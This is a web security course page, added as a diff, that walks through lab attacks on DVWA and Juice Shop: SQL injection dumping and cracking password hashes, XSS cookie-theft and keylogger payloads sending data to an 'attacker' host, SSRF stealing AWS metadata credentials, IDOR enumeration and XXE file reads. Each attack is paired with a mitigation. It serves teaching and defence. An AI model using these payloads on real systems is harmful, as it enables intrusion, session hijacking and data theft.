@@ -1,0 +1,439 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR — Cybersec Zero to Hero</title>
+<link rel="stylesheet" href="../../styles.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-mark">&gt;_</div>
+      <div>
+        <div class="brand-title">CYBERSEC</div>
+        <div class="brand-subtitle">zero · to · hero</div>
+      </div>
+    </div>
+    <div class="lang-switch"><a href="../../pages/10b-walkthrough-byte-per-byte.html" class="lang-link" title="Passa all'italiano"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="10" height="20" fill="#009246"/><rect x="10" width="10" height="20" fill="#fff"/><rect x="20" width="10" height="20" fill="#ce2b37"/></svg> IT</a><span class="lang-active" title="English"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="30" height="20" fill="#012169"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#fff" stroke-width="3"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#c8102e" stroke-width="1.5"/><path d="M15,0 v20 M0,10 h30" stroke="#fff" stroke-width="5"/><path d="M15,0 v20 M0,10 h30" stroke="#c8102e" stroke-width="3"/></svg> EN</span></div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-row">
+      <div class="search-inputwrap">
+        <span class="search-icon" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="20" y1="20" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input class="search-input" id="search-input" type="text" placeholder="search... (press /)" autocomplete="off" aria-label="Search">
+        <button class="search-clear" id="search-clear" type="button" aria-label="Clear" title="Clear">&times;</button>
+      </div>
+      <button class="search-btn" id="search-btn" type="button" aria-label="SEARCH" title="SEARCH">SEARCH</button>
+    </div>
+    <div class="search-hits" id="search-hits" role="listbox"></div>
+  </div>
+  <div class="sidebar-nav">
+    <nav class="nav-section">
+      <div class="nav-section-title">Path</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="../index.html"><span class="num">00</span>Home</a></li>
+        <li class="nav-item"><a href="../pages/00-path-and-mindset.html" class=""><span class="num">00</span>Path, mindset, ethics and law</a></li><li class="nav-item"><a href="../pages/00b-math-and-cs.html" class=""><span class="num">00b</span>Math and computation theory (the bare minimum, integrated)</a></li><li class="nav-item"><a href="../pages/01-cs-fundamentals.html" class=""><span class="num">01</span>Computer science fundamentals for security</a></li><li class="nav-item"><a href="../pages/01b-assembly-from-zero.html" class=""><span class="num">01b</span>x86-64 and ARM64 Assembly from zero</a></li><li class="nav-item"><a href="../pages/02-essential-linux.html" class=""><span class="num">02</span>Essential Linux for security</a></li><li class="nav-item"><a href="../pages/02b-regex-automata.html" class=""><span class="num">02b</span>Regex, automata, and parsers for security</a></li><li class="nav-item"><a href="../pages/03-networking-tcp-ip.html" class=""><span class="num">03</span>Networking: from cables to TCP/IP</a></li><li class="nav-item"><a href="../pages/04-http-tls.html" class=""><span class="num">04</span>HTTP, HTTPS and TLS in depth</a></li><li class="nav-item"><a href="../pages/05-cryptography.html" class=""><span class="num">05</span>Cryptography: theory and practice</a></li><li class="nav-item"><a href="../pages/05b-crypto-worked-examples.html" class=""><span class="num">05b</span>Cryptography — step-by-step worked examples</a></li><li class="nav-item"><a href="../pages/06-os-internals.html" class=""><span class="num">06</span>OS internals: Linux and Windows in depth</a></li><li class="nav-item"><a href="../pages/07-programming-for-security.html" class=""><span class="num">07</span>Programming for security: Python, C, Go</a></li><li class="nav-item"><a href="../pages/08-osint-recon.html" class=""><span class="num">08</span>OSINT and reconnaissance</a></li><li class="nav-item"><a href="../pages/09-scanning-enumeration.html" class=""><span class="num">09</span>Scanning, enumeration and fingerprinting</a></li><li class="nav-item"><a href="../pages/10-owasp-top10.html" class=""><span class="num">10</span>OWASP Top 10 and beyond — basic web vulnerabilities</a></li><li class="nav-item"><a href="../pages/10b-walkthrough-byte-by-byte.html" class="active"><span class="num">10b</span>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR</a></li><li class="nav-item"><a href="../pages/11-advanced-web.html" class=""><span class="num">11</span>Advanced web hacking</a></li><li class="nav-item"><a href="../pages/12-network-attacks.html" class=""><span class="num">12</span>Network attacks: MITM, spoofing, pivoting</a></li><li class="nav-item"><a href="../pages/13-active-directory.html" class=""><span class="num">13</span>Active Directory hacking</a></li><li class="nav-item"><a href="../pages/14-exploit-development.html" class=""><span class="num">14</span>Exploit development: from buffer overflow to ROP</a></li><li class="nav-item"><a href="../pages/14b-bof-to-shell-complete.html" class=""><span class="num">14b</span>BoF → shell: a complete exploit from zero</a></li><li class="nav-item"><a href="../pages/15-reverse-engineering.html" class=""><span class="num">15</span>Reverse engineering</a></li><li class="nav-item"><a href="../pages/16-malware-analysis.html" class=""><span class="num">16</span>Malware: taxonomy and analysis</a></li><li class="nav-item"><a href="../pages/17-mobile-security.html" class=""><span class="num">17</span>Mobile security: Android and iOS</a></li><li class="nav-item"><a href="../pages/18-cloud-security.html" class=""><span class="num">18</span>Cloud security: AWS, Azure, GCP</a></li><li class="nav-item"><a href="../pages/19-container-kubernetes.html" class=""><span class="num">19</span>Containers and Kubernetes</a></li><li class="nav-item"><a href="../pages/20-wireless-radio.html" class=""><span class="num">20</span>Wireless and radio: WiFi, BT, SDR</a></li><li class="nav-item"><a href="../pages/21-hardware-firmware.html" class=""><span class="num">21</span>Hardware and firmware hacking</a></li><li class="nav-item"><a href="../pages/22-forensics-dfir.html" class=""><span class="num">22</span>Forensics and DFIR</a></li><li class="nav-item"><a href="../pages/23-blue-team-soc.html" class=""><span class="num">23</span>Blue team: SOC, SIEM, EDR, hunting</a></li><li class="nav-item"><a href="../pages/24-threat-intelligence.html" class=""><span class="num">24</span>Threat intelligence</a></li><li class="nav-item"><a href="../pages/25-grc-regulations.html" class=""><span class="num">25</span>GRC, regulations, and standards</a></li><li class="nav-item"><a href="../pages/26-red-team.html" class=""><span class="num">26</span>Red team and adversary emulation</a></li><li class="nav-item"><a href="../pages/27-ai-ml-security.html" class=""><span class="num">27</span>AI / ML security</a></li><li class="nav-item"><a href="../pages/28-capstone-roadmap.html" class=""><span class="num">28</span>Capstone: CTF roadmap, home lab, certifications</a></li><li class="nav-item"><a href="../pages/29-master-cheatsheet.html" class=""><span class="num">29</span>Master cheatsheet</a></li><li class="nav-item"><a href="../pages/30-extended-glossary.html" class=""><span class="num">30</span>Extended glossary (250+ terms)</a></li><li class="nav-item"><a href="../pages/31-it-eu-regulations.html" class=""><span class="num">31</span>IT/EU regulatory references in detail</a></li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+  <main class="main">
+    <div class="content">
+      <div class="page-meta">
+        <span class="pill">Web</span>
+        <span>Section 14 of 36</span>
+        <span class="level-tag level-int">Level: intermediate</span>
+      </div>
+      <h1>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR</h1>
+      <p class="summary">Four real attacks executed step-by-step with complete request/response pairs, every character explained. All in a legal local environment. From &#x27;I understand the words&#x27; to &#x27;I understand with my hands on the keys&#x27;.</p>
+      <div class="info-card">
+  <div class="label">Area</div>
+  <div>Web</div>
+  <div class="label">Prerequisites</div>
+  <ul class="source-list"><li>Section 04, 10</li></ul>
+  <div class="label">Tools</div>
+  <ul class="source-list"><li>Burp Suite Community or curl + jq</li><li>DVWA / Juice Shop / WebGoat in Docker</li><li>Browser DevTools</li></ul>
+</div>
+      <blockquote>
+<p>Every example in this section is runnable on your Docker lab (DVWA / Juice Shop). Run every request, read every byte. No "trust the tool".</p>
+</blockquote>
+<h2 id="quick-setup">Quick setup</h2>
+<pre><code class="language-bash">docker run --rm -it -p 80:80 vulnerables/web-dvwa
+# Open http://localhost  user: admin  pass: password
+# Setup database (click &quot;Create / Reset Database&quot;)
+# DVWA Security: Low (to start)
+</code></pre>
+<h2 id="1-sql-injection-the-first-the-archetype">1. SQL Injection — the first, the archetype</h2>
+<h3 id="the-vulnerable-page">The vulnerable page</h3>
+<p>URL: <code>http://localhost/vulnerabilities/sqli/</code></p>
+<p>Form: "User ID" field, submit. Below, there's code (in "view source" mode):</p>
+<pre><code class="language-php">$id = $_REQUEST[ 'id' ];
+$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query);
+</code></pre>
+<p><strong>Obvious vulnerability</strong>: <code>$id</code> concatenated directly into SQL. No escaping, no prepared statement.</p>
+<h3 id="step-1-innocuous-input-understand-the-baseline">Step 1 — innocuous input, understand the baseline</h3>
+<p>HTTP request the browser sends:</p>
+<pre><code class="language-http">GET /vulnerabilities/sqli/?id=1&amp;Submit=Submit HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=abc...; security=low
+</code></pre>
+<p>Response (relevant part):</p>
+<pre><code class="language-html">&lt;pre&gt;ID: 1&lt;br /&gt;First name: admin&lt;br /&gt;Surname: admin&lt;/pre&gt;
+</code></pre>
+<p><strong>Actual query</strong> on the server side:</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '1';
+</code></pre>
+<p>Returns 1 row: admin/admin.</p>
+<h3 id="step-2-test-the-injection">Step 2 — test the injection</h3>
+<p>What happens if you put <code>1'</code>? The query becomes:</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '1'';
+                                                          ^^ unpaired quote
+</code></pre>
+<p>SQL error. Confirms the vulnerability:</p>
+<pre><code class="language-http">GET /vulnerabilities/sqli/?id=1'&amp;Submit=Submit
+</code></pre>
+<p>Response:</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your 
+MySQL server version for the right syntax to use near ''1''' at line 1
+</code></pre>
+<p><strong>SQL error leaked in the response = injection confirmed + "error-based" feasible.</strong></p>
+<h3 id="step-3-logical-bypass-get-everything">Step 3 — logical bypass (get everything)</h3>
+<p>Payload: <code>1' OR '1'='1</code>. The query becomes:</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
+</code></pre>
+<p>Condition <code>user_id = '1'</code> (true for Admin) OR <code>'1'='1'</code> (always true) → <strong>WHERE is always true</strong> → returns <strong>all users</strong>.</p>
+<pre><code class="language-http">GET /vulnerabilities/sqli/?id=1'+OR+'1'='1&amp;Submit=Submit
+</code></pre>
+<p>The space is URL-encoded as <code>+</code>. <code>%20</code> works too.</p>
+<p>Response:</p>
+<pre><code>ID: 1' OR '1'='1
+First name: admin   Surname: admin
+First name: Gordon  Surname: Brown
+First name: Hack    Surname: Me
+First name: Pablo   Surname: Picasso
+First name: Bob     Surname: Smith
+</code></pre>
+<p>5 users. <strong>Authentication-equivalent bypass.</strong></p>
+<h3 id="step-4-union-based-to-extract-arbitrary-data">Step 4 — UNION-based to extract arbitrary data</h3>
+<p>To use <code>UNION SELECT</code>, I need to know <strong>how many fields</strong> the original query has. Test with <code>ORDER BY</code>:</p>
+<pre><code>?id=1' ORDER BY 1-- -
+?id=1' ORDER BY 2-- -
+?id=1' ORDER BY 3-- -
+</code></pre>
+<p>The <code>--</code> comment (with a trailing space!) discards the rest of the original query. The third gives error <code>Unknown column '3'</code>. So <strong>2 columns</strong>.</p>
+<p>Now UNION to extract the DB version:</p>
+<pre><code>?id=1' UNION SELECT 1, version()-- -
+</code></pre>
+<p>Query:</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id='1' UNION SELECT 1, version()-- -';
+</code></pre>
+<p>Response:</p>
+<pre><code>ID: 1' UNION SELECT 1, version()-- 
+First name: admin
+Surname: admin
+First name: 1
+Surname: 10.1.26-MariaDB-0+deb9u1
+</code></pre>
+<p><strong>You have the DB version.</strong> Now you know it's MariaDB 10.1 → docs for specific syntax.</p>
+<h3 id="step-5-read-information_schema-the-database-map">Step 5 — read <code>information_schema</code> (the database map)</h3>
+<p>In MySQL/MariaDB there's a system table <code>information_schema.tables</code> that lists everything.</p>
+<pre><code>?id=1' UNION SELECT 1, group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()-- -
+</code></pre>
+<p>Broken down:
+- <code>UNION SELECT 1, X</code> → two columns (compatible with the original SELECT).
+- <code>group_concat(table_name SEPARATOR ',')</code> → concatenates table names into a single string.
+- <code>FROM information_schema.tables</code> → metadata.
+- <code>WHERE table_schema=database()</code> → only the current DB.
+- <code>--</code> → comment (closes the rest).</p>
+<p>Response (excerpt):</p>
+<pre><code>Surname: guestbook,users
+</code></pre>
+<p>There's the <code>users</code> table.</p>
+<h3 id="step-6-extract-users-columns">Step 6 — extract <code>users</code> columns</h3>
+<pre><code>?id=1' UNION SELECT 1, group_concat(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
+</code></pre>
+<p>Response:</p>
+<pre><code>Surname: user_id,first_name,last_name,user,password,avatar,...
+</code></pre>
+<h3 id="step-7-extract-username-and-password-hash">Step 7 — extract username and password hash</h3>
+<pre><code>?id=1' UNION SELECT user, password FROM users-- -
+</code></pre>
+<p>Response:</p>
+<pre><code>First name: admin       Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+First name: gordonb     Surname: e99a18c428cb38d5f260853678922e03
+First name: 1337        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+First name: pablo       Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+First name: smithy      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+<p>MD5 hashes! Crack online or offline:</p>
+<pre><code class="language-bash">echo &quot;5f4dcc3b5aa765d61d8327deb882cf99&quot; &gt; h.txt
+hashcat -m 0 h.txt rockyou.txt
+# → password
+</code></pre>
+<p><strong>Game over.</strong> Username admin / password "password".</p>
+<h3 id="step-8-automate-with-sqlmap">Step 8 — automate with sqlmap</h3>
+<p>The whole manual step 1-7 is didactic. In production you use <code>sqlmap</code>:</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; \
+  --cookie=&quot;PHPSESSID=abc; security=low&quot; --batch --dbs
+
+sqlmap -u &quot;...&quot; --cookie=&quot;...&quot; -D dvwa --tables
+sqlmap -u &quot;...&quot; --cookie=&quot;...&quot; -D dvwa -T users --dump
+</code></pre>
+<p>In ~10 seconds you'd have the hashes. But <strong>if you didn't know the manual, you'd use sqlmap as a black box and you wouldn't understand the bypasses when a WAF gets in the way.</strong></p>
+<h3 id="mitigation-correct-form">Mitigation (correct form)</h3>
+<pre><code class="language-php">$stmt = $pdo-&gt;prepare(&quot;SELECT first_name, last_name FROM users WHERE user_id = ?&quot;);
+$stmt-&gt;execute([$id]);
+</code></pre>
+<p>Parameters <strong>separated</strong> from the query → user input cannot alter SQL structure.</p>
+<h2 id="2-reflected-xss-code-execution-in-the-victims-browser">2. Reflected XSS — code execution in the victim's browser</h2>
+<h3 id="vulnerable-page">Vulnerable page</h3>
+<p>URL: <code>http://localhost/vulnerabilities/xss_r/?name=test</code></p>
+<p>PHP source:</p>
+<pre><code class="language-php">$html = &quot;&lt;pre&gt;Hello &quot; . $_GET['name'] . &quot;&lt;/pre&gt;&quot;;
+echo $html;
+</code></pre>
+<p>Input reflected without HTML escaping. Test:</p>
+<pre><code>?name=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>HTML response:</p>
+<pre><code class="language-html">&lt;pre&gt;Hello &lt;script&gt;alert(1)&lt;/script&gt;&lt;/pre&gt;
+</code></pre>
+<p>Browser parses, executes → popup <code>1</code>. <strong>XSS confirmed.</strong></p>
+<h3 id="step-2-useful-non-innocuous-payloads">Step 2 — useful (non-innocuous) payloads</h3>
+<p>Cookie steal:</p>
+<pre><code class="language-html">&lt;script&gt;fetch('http://attacker/?c='+encodeURIComponent(document.cookie))&lt;/script&gt;
+</code></pre>
+<p>In URL:</p>
+<pre><code>?name=%3Cscript%3Efetch('http://attacker/?c='%2BencodeURIComponent(document.cookie))%3C/script%3E
+</code></pre>
+<p><strong>You send this link to the victim.</strong> If they click → their browser fetches attacker passing the cookies. You read them in your access.log and use them for session hijack.</p>
+<h3 id="step-3-bypassing-a-weak-filter">Step 3 — bypassing a weak filter</h3>
+<p>If the developer adds a naive filter:</p>
+<pre><code class="language-php">$name = str_replace('&lt;script&gt;', '', $_GET['name']);
+</code></pre>
+<p>Bypass:
+- Doubled tag: <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code> → it filters the inner one, the outer remains.
+- Case mix: <code>&lt;ScRiPt&gt;</code> (PHP html is non-case-sensitive, but some filters are case-sensitive).
+- Event handler: <code>&lt;img src=x onerror=alert(1)&gt;</code> — no "script" string.
+- SVG: <code>&lt;svg onload=alert(1)&gt;</code>.
+- Body: <code>&lt;body onpageshow=alert(1)&gt;</code>.
+- Iframe srcdoc: <code>&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code>.
+- JS protocol: <code>&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code>.
+- DOM clobbering, mutation XSS, ... </p>
+<p>Reference: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS Cheat Sheet</a>.</p>
+<h3 id="step-4-more-realistic-payload-keylogger">Step 4 — more realistic payload (keylogger)</h3>
+<pre><code class="language-html">&lt;script&gt;
+const k=[]; 
+document.addEventListener('keydown', e =&gt; {
+    k.push(e.key);
+    if (k.length &gt; 50) {
+        fetch('http://attacker/?l=' + encodeURIComponent(k.join('')));
+        k.length = 0;
+    }
+});
+&lt;/script&gt;
+</code></pre>
+<p>On a page with a login form → you capture the password as it's typed.</p>
+<h3 id="mitigation-in-order-of-robustness">Mitigation (in order of robustness)</h3>
+<ol>
+<li><strong>Context-aware encoding</strong>: HTML body, attribute, JS string, URL — different encoding for each. Use a safe template engine (Jinja2 autoescape, React JSX).</li>
+<li><strong>CSP</strong> strict (no <code>unsafe-inline</code>, nonces or hash-based, no <code>unsafe-eval</code>).</li>
+<li><strong>HttpOnly</strong> cookies (no JS access → no theft via XSS-document.cookie).</li>
+<li><strong>User HTML sanitization</strong>: DOMPurify if you really must accept HTML.</li>
+</ol>
+<h2 id="3-ssrf-the-server-makes-requests-that-you-control">3. SSRF — the server makes requests that you control</h2>
+<h3 id="didactic-setup">Didactic setup</h3>
+<p>Lab: WebGoat or Juice Shop. Endpoint that fetches a URL:</p>
+<pre><code class="language-python">@app.get('/preview')
+def preview(url):
+    r = requests.get(url, timeout=5)
+    return r.text
+</code></pre>
+<p>Naive test:</p>
+<pre><code>GET /preview?url=https://example.com
+</code></pre>
+<p>Response: example.com content. ✅ works as intended.</p>
+<h3 id="step-1-basic-ssrf-scan-the-internal-network">Step 1 — basic SSRF, scan the internal network</h3>
+<pre><code>?url=http://127.0.0.1:22
+</code></pre>
+<p>If the server (containerized or EC2) has SSH locally, you get the banner:</p>
+<pre><code>SSH-2.0-OpenSSH_8.4p1 Debian...
+</code></pre>
+<p><strong>You have access (via SSRF) to private services.</strong></p>
+<p>Enumerate internal ports:</p>
+<pre><code class="language-bash">for p in 22 80 443 3306 5432 6379 8080 8443 27017; do
+    curl -s &quot;http://target/preview?url=http://127.0.0.1:$p&quot; | head -1
+done
+</code></pre>
+<h3 id="step-2-read-aws-metadata-imdsv1">Step 2 — read AWS metadata (IMDSv1)</h3>
+<p>On EC2 with IMDSv1 active:</p>
+<pre><code>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</code></pre>
+<p>Response: <code>my-app-role</code>.</p>
+<pre><code>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role
+</code></pre>
+<p>Response (JSON):</p>
+<pre><code class="language-json">{
+  &quot;Code&quot;: &quot;Success&quot;,
+  &quot;LastUpdated&quot;: &quot;2026-05-21T10:00:00Z&quot;,
+  &quot;Type&quot;: &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot;: &quot;ASIAEXAMPLE...&quot;,
+  &quot;SecretAccessKey&quot;: &quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCY...&quot;,
+  &quot;Token&quot;: &quot;FwoGZXIvYXdzEK//...&quot;,
+  &quot;Expiration&quot;: &quot;2026-05-21T16:00:00Z&quot;
+}
+</code></pre>
+<p>Use with AWS CLI:</p>
+<pre><code class="language-bash">export AWS_ACCESS_KEY_ID=ASIAEXAMPLE...
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7...
+export AWS_SESSION_TOKEN=FwoGZXIvYXdz...
+aws sts get-caller-identity
+aws s3 ls
+aws iam list-attached-role-policies --role-name my-app-role
+</code></pre>
+<p>From here exfil buckets, lambda, etc. <strong>Catastrophic.</strong></p>
+<h3 id="step-3-bypass-weak-filters">Step 3 — bypass weak filters</h3>
+<p>The server tries to filter loopback:</p>
+<pre><code class="language-python">if 'localhost' in url or '127.0.0.1' in url:
+    return &quot;blocked&quot;
+</code></pre>
+<p>Bypass:
+- <code>http://127.1</code> (valid short form).
+- <code>http://0.0.0.0</code>.
+- <code>http://[::1]/</code> (IPv6 loopback).
+- <code>http://2130706433/</code> (127.0.0.1 in decimal).
+- <code>http://0x7f000001/</code> (hex).
+- <code>http://017700000001/</code> (octal).
+- <code>http://127.0.0.1.nip.io/</code> (DNS service that resolves to 127.0.0.1).
+- DNS rebinding: a domain that resolves first to an innocuous IP, then (after the check) to 127.0.0.1.</p>
+<h3 id="step-4-protocol-smuggling">Step 4 — protocol smuggling</h3>
+<p>If the HTTP library supports multiple schemes:
+- <code>file:///etc/passwd</code> — LFI via SSRF.
+- <code>gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A</code> — exploit unauthenticated Redis via SSRF (RESP command corruption).
+- <code>dict://</code>, <code>ldap://</code>.</p>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li><strong>Whitelist</strong> of allowed domains.</li>
+<li>Resolve DNS server-side, check the resulting IP against RFC1918/loopback/link-local, <strong>reject</strong>, then connect with the fixed IP.</li>
+<li>Network: nginx/HAProxy in front, block 169.254.0.0/16.</li>
+<li><strong>IMDSv2</strong> (requires PUT + token).</li>
+<li>Disable dangerous schemes (<code>gopher</code>, <code>file</code>, <code>dict</code>).</li>
+</ul>
+<h2 id="4-idor-the-most-boring-and-most-prevalent-bug">4. IDOR — the most boring and most prevalent bug</h2>
+<h3 id="lab">Lab</h3>
+<p>A toy webapp with <code>/api/orders/{id}</code> that returns the order if it belongs to the logged-in user. Spoiler: the authorization check is missing.</p>
+<h3 id="step-1-figure-out-the-pattern">Step 1 — figure out the pattern</h3>
+<p>Log in as Alice. Go to your orders. URL:</p>
+<pre><code>GET /api/orders/1042  →  {&quot;id&quot;:1042,&quot;user&quot;:&quot;alice&quot;,&quot;items&quot;:[...]}
+GET /api/orders/1043  →  {&quot;id&quot;:1043,&quot;user&quot;:&quot;alice&quot;,&quot;items&quot;:[...]}
+</code></pre>
+<h3 id="step-2-increment">Step 2 — increment</h3>
+<pre><code>GET /api/orders/1041  →  {&quot;id&quot;:1041,&quot;user&quot;:&quot;bob&quot;,&quot;items&quot;:[...]}
+GET /api/orders/1040  →  {&quot;id&quot;:1040,&quot;user&quot;:&quot;alice&quot;,&quot;items&quot;:[...]}
+</code></pre>
+<p><strong>You see Bob's orders.</strong> No authorization check on the object.</p>
+<h3 id="step-3-automate-enumeration">Step 3 — automate enumeration</h3>
+<pre><code class="language-python">import requests
+s = requests.Session()
+s.post(&quot;https://target/login&quot;, json={&quot;user&quot;:&quot;alice&quot;,&quot;pass&quot;:&quot;...&quot;})
+
+leaked = []
+for i in range(1, 10000):
+    r = s.get(f&quot;https://target/api/orders/{i}&quot;)
+    if r.status_code == 200:
+        data = r.json()
+        if data['user'] != 'alice':
+            leaked.append(data)
+
+print(f&quot;Leaked {len(leaked)} orders of other users&quot;)
+</code></pre>
+<p>In 10 minutes <strong>10k records of privacy violation</strong>.</p>
+<h3 id="step-4-variants">Step 4 — variants</h3>
+<ul>
+<li><strong>BFLA</strong> (Broken Function Level Authz): a normal user calls an admin endpoint. <code>GET /api/admin/users</code> → instead of 403 it works.</li>
+<li><strong>Parameter pollution</strong>: <code>?user_id=alice&amp;user_id=bob</code> (the second one is used).</li>
+<li><strong>Mass assignment</strong>: PATCH an order with a <code>user_id</code> field → you gift yourself someone else's order.</li>
+<li><strong>Guessable GUID</strong>: GUID v1 contains MAC + timestamp → guessable.</li>
+</ul>
+<h3 id="mitigation_1">Mitigation</h3>
+<pre><code class="language-python">@app.get('/api/orders/&lt;int:id&gt;')
+@login_required
+def get_order(id):
+    order = Order.query.get_or_404(id)
+    if order.user_id != current_user.id and not current_user.is_admin:
+        abort(403)
+    return order.to_json()
+</code></pre>
+<p><strong>Always-on per-object authorization check</strong>. Pattern: gateway/middleware that enforces policy → no "I forgot".</p>
+<h2 id="5-bonus-xxe-in-10-seconds">5. Bonus — XXE in 10 seconds</h2>
+<p>A server that parses XML:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;user&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;/user&gt;
+</code></pre>
+<p>Add an external DTD:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt;
+</code></pre>
+<p>If the parser is permissive → <code>&lt;name&gt;</code> expands <code>&amp;x;</code> with the contents of <code>/etc/passwd</code>. <strong>LFI via XML.</strong></p>
+<p>Mitigation: <code>defusedxml</code> in Python or disable DTDs in the parser.</p>
+<h2 id="key-concepts">Key concepts</h2>
+<ol>
+<li><strong>SQLi</strong>: understand the internal query, manipulate the syntax, read the error → leak. Mitigation: prepared statements.</li>
+<li><strong>XSS</strong>: input in the HTML/JS context, executes in the victim's browser. Mitigation: context-aware encoding + CSP + HttpOnly.</li>
+<li><strong>SSRF</strong>: server fetches your URL, you have access to internal services + cloud metadata. Mitigation: whitelist + IMDSv2.</li>
+<li><strong>IDOR</strong>: no per-object authorization check. Mitigation: always-on authz middleware.</li>
+</ol>
+<p>Now when the SIEM gives you an alert "SQL injection attempt", it won't feel abstract anymore — you'll know exactly the sequence of bytes that generated it.</p>
+      <nav class="pager">
+<a href="10-owasp-top10.html" class="prev"><span class="label">← Previous</span><span class="title">OWASP Top 10 and beyond — basic web vulnerabilities</span></a>
+<a href="11-advanced-web.html" class="next"><span class="label">Next →</span><span class="title">Advanced web hacking</span></a>
+</nav>
+      <footer class="page-footer">
+        <p><strong>Cybersec Zero to Hero</strong> — built as a continuous path. Static build from Markdown.</p><p>Educational material. Everything you learn here is to be used only on systems you own, in labs, in authorized bug-bounty programs, or under signed pentest contracts. <strong>Don't break the law.</strong></p>
+      </footer>
+    </div>
+  </main>
+</div>
+<script src="../search-data.js"></script>
+<script src="../../search.js"></script>
+<script src="../../toc.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+  mermaid.initialize({
+    startOnLoad: true,
+    theme: 'base',
+    themeVariables: {
+      darkMode: true, background: '#131a1e', primaryColor: '#1d262b',
+      primaryTextColor: '#e8eef0', primaryBorderColor: '#00ff9c',
+      lineColor: '#00e6ff', secondaryColor: '#11171a', tertiaryColor: '#161d21',
+      mainBkg: '#1d262b', nodeBorder: '#00ff9c', clusterBkg: '#0b0f10',
+      clusterBorder: '#243035', titleColor: '#00ff9c',
+      edgeLabelBackground: '#0b0f10', textColor: '#e8eef0',
+      labelTextColor: '#e8eef0', actorBkg: '#1d262b', actorBorder: '#00ff9c',
+      actorTextColor: '#00ff9c', actorLineColor: '#00e6ff',
+      signalColor: '#e8eef0', signalTextColor: '#e8eef0',
+      labelBoxBkgColor: '#1d262b', labelBoxBorderColor: '#00ff9c',
+      noteBkgColor: '#ffe066', noteTextColor: '#0b0f10', noteBorderColor: '#ffe066',
+      activationBkgColor: '#1d262b', activationBorderColor: '#00ff9c',
+      sequenceNumberColor: '#0b0f10'
+    },
+    flowchart: { curve: 'basis', padding: 16 },
+    sequence: { mirrorActors: false, bottomMarginAdj: 10 },
+    fontFamily: 'JetBrains Mono, Cascadia Code, Consolas, monospace'
+  });
+</script>
+</body>
+</html>
